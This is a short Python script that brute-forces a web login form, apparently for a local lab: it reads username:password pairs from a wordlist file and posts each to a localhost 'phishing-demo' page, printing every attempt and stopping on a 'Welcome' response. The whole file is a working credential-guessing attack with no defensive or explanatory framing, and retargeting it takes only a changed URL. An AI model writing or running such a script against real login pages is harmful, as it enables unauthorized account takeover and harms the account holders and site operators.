import requests

url = "http://localhost/phishing-demo/index.html"  # intended target website

with open("wordlist.txt", "r") as f:
    for line in f:
        username, password = line.strip().split(":")
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)

        print(f"Trying {username}:{password} -> {response.status_code}")
        if "Welcome" in response.text:
            print(f"✅ Success: {username}:{password}")
            break
